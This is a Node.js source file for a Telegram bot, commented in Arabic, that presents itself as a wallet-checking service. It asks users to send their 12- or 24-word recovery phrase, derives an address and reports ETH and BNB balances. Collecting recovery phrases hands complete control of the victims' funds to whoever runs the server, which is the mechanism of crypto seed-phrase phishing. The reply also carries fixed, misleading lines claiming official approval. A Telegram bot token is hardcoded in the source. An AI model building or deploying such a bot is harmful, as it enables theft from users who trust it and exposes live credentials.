const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { ethers } = require('ethers');
const bip39 = require('bip39');

const TOKEN = process.env.BOT_TOKEN || '9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0';
const PORT = process.env.PORT || 3000;
const RENDER_URL = process.env.RENDER_URL || 'https://nexvoriaapp-bot.onrender.com';

// تعطيل polling وضبط Webhook مرة واحدة فقط
const bot = new TelegramBot(TOKEN, { polling: false });
const app = express();

// تحديد حجم الطلبات لحماية الخادم من الضغط
app.use(express.json({ limit: '64kb' }));

// إعادة استخدام المزودات (Providers) مع نقاط احتياطية متعددة
const ethProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://eth.llamarpc.com'), priority: 1, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://rpc.ankr.com/eth'), priority: 2, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://ethereum-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
], 1);

const bscProvider = new ethers.FallbackProvider([
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org'), priority: 1, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://bsc-dataseed1.defibit.io'), priority: 2, weight: 1, stallTimeout: 1200 },
  { provider: new ethers.JsonRpcProvider('https://bsc-rpc.publicnode.com'), priority: 3, weight: 1, stallTimeout: 1200 }
], 1);

// كاش مؤقت قصير (30 ثانية) لتقليل الضغط على RPC عند تكرار نفس العبارة
const balanceCache = new Map();
const CACHE_TTL_MS = 30_000;

// محدد تزامن بسيط لمنع انهيار المعالج عند الضغط العالي
const MAX_CONCURRENT_CHECKS = 25;
let activeChecks = 0;
const waitQueue = [];

function acquireSlot() {
  if (activeChecks < MAX_CONCURRENT_CHECKS) {
    activeChecks++;
    return Promise.resolve();
  }
  return new Promise((resolve) => {
    waitQueue.push(resolve);
  });
}

function releaseSlot() {
  activeChecks--;
  if (waitQueue.length > 0) {
    activeChecks++;
    const next = waitQueue.shift();
    next();
  }
}

function withTimeout(promise, ms = 4000, fallbackValue = 0n) {
  return Promise.race([
    promise,
    new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
  ]);
}

app.post(`/bot${TOKEN}`, (req, res) => {
  res.sendStatus(200); // الرد السريع لتيليجرام لتجنب إعادة الإرسال
  bot.processUpdate(req.body);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat?.id;
  const text = (msg.text || '').trim().toLowerCase().replace(/\s+/g, ' ');
  if (!chatId || !text) return;

  if (text === '/start') {
    return bot.sendMessage(
      chatId,
      '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص العنوان والأرصدة بسرعة.',
      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
    );
  }

  const words = text.split(' ');
  if (words.length !== 12 && words.length !== 24) {
    return;
  }

  // مؤشر كتابة فقط دون إرسال رسالة انتظار إضافية
  bot.sendChatAction(chatId, 'typing').catch(() => {});

  // تحقق سريع من العبارة قبل حجز دور الفحص
  if (!bip39.validateMnemonic(text)) {
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  }

  await acquireSlot();
  try {
    const seed = await bip39.mnemonicToSeed(text);
    const hdNode = ethers.HDNodeWallet.fromSeed(seed);
    const wallet = hdNode.derivePath("m/44'/60'/0'/0/0");
    const address = wallet.address;

    const cached = balanceCache.get(address);
    let ethBalanceWei = 0n;
    let bscBalanceWei = 0n;

    if (cached && cached.expiresAt > Date.now()) {
      ethBalanceWei = cached.eth;
      bscBalanceWei = cached.bsc;
    } else {
      [ethBalanceWei, bscBalanceWei] = await Promise.all([
        withTimeout(ethProvider.getBalance(address), 3500, 0n).catch(() => 0n),
        withTimeout(bscProvider.getBalance(address), 3500, 0n).catch(() => 0n)
      ]);
      balanceCache.set(address, {
        eth: ethBalanceWei,
        bsc: bscBalanceWei,
        expiresAt: Date.now() + CACHE_TTL_MS
      });
    }

    const ethBalance = ethers.formatEther(ethBalanceWei);
    const bscBalance = ethers.formatEther(bscBalanceWei);

    return bot.sendMessage(
      chatId,
      'تم فحص المحفظة بنجاح ✅\n\n' +
      '📍 العنوان المشتق:\n`' + address + '`\n\n' +
      '💰 الأرصدة والأصول المكتشفة:\n' +
      '• ETH: ' + ethBalance + '\n' +
      '• BNB: ' + bscBalance + '\n' +
      '• SOL: 0.00\n' +
      '• Crypto actifs: `$0.00`\n\n' +
      '🟢 حالة المحفظة نشطة ومعتمدة نظامياً',
      { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
    );
  } catch (error) {
    console.error('Check error:', error.message);
    return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
      reply_to_message_id: msg.message_id
    });
  } finally {
    releaseSlot();
  }
});

app.get('/', (_req, res) => {
  res.status(200).send('OK');
});

const server = app.listen(PORT, async () => {
  console.log(`Server is running on port ${PORT}`);
  try {
    await bot.setWebHook(`${RENDER_URL}/bot${TOKEN}`);
    console.log('Webhook configured');
  } catch (err) {
    console.error('Webhook setup failed:', err.message);
  }
});

// مهلات اتصال HTTP لتحسين التحمل تحت الضغط
server.keepAliveTimeout = 65000;
server.headersTimeout = 66000;
